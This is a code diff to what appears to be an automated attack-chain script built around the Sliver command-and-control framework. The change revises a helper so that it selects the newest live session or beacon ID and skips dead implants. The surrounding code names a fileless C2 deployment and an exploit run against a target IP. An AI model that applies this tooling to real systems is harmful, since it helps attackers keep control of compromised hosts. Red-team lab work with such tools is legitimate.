@@ -407,13 +407,17 @@ def deploy_fileless_c2(target_ip, kali_ip, file_port=8000):
 _SESSION_HEADER_RE = re.compile(r"^\s*ID\s+[A-Z][A-Za-z]+")
 
 
-def _parse_first_id(sliver_output: str) -> str | None:
-    """Extract the first session/beacon name from a sliver-client table.
+def _parse_last_active_id(sliver_output: str) -> str | None:
+    """Extract the most recently-spawned active session/beacon ID from a
+    sliver-client table.
 
-    Returns the first data-row's first token, or ``None`` if no table was
-    rendered. Skips header, divider, and blank lines.
+    Returns the *last* data-row's first token, or ``None`` if no table was
+    rendered. Skips header, divider, blank lines, and DEAD/KILLED sessions.
+    Choosing the last row guarantees we pick the newest implant when the
+    chain runs more than once and the table still shows stale rows.
     """
     saw_header = False
+    last_id = None
     for line in sliver_output.splitlines():
         if _SESSION_HEADER_RE.search(line):
             saw_header = True
@@ -422,13 +426,13 @@ def _parse_first_id(sliver_output: str) -> str | None:
             continue
         stripped = line.strip()
         if not stripped:
-            # End of the table -- no data rows present.
-            return None
-        if set(stripped) <= set("= "):
-            # Divider row ('====  =========  ...').
             continue
-        return stripped.split()[0]
-    return None
+        if set(stripped) <= set("= "):
+            continue
+        if "[DEAD]" in stripped or "[KILLED]" in stripped:
+            continue
+        last_id = stripped.split()[0]
+    return last_id
 
 
 def _list_sliver(query: str, timeout: int = 10) -> str:
@@ -513,8 +517,8 @@ def run(target_ip: str, kali_ip: str = "10.10.0.2", file_port: int = 8000) -> di
     if not success:
         raise RuntimeError("advanced exploit returned no Sliver session/beacon")
 
-    sess_id = _parse_first_id(_list_sliver("sessions"))
-    beac_id = _parse_first_id(_list_sliver("beacons"))
+    sess_id = _parse_last_active_id(_list_sliver("sessions"))
+    beac_id = _parse_last_active_id(_list_sliver("beacons"))
     if not sess_id:
         raise RuntimeError("advanced exploit: session implant did not appear in Sliver")
     log(f"[+] Sliver Session ID: {sess_id}")
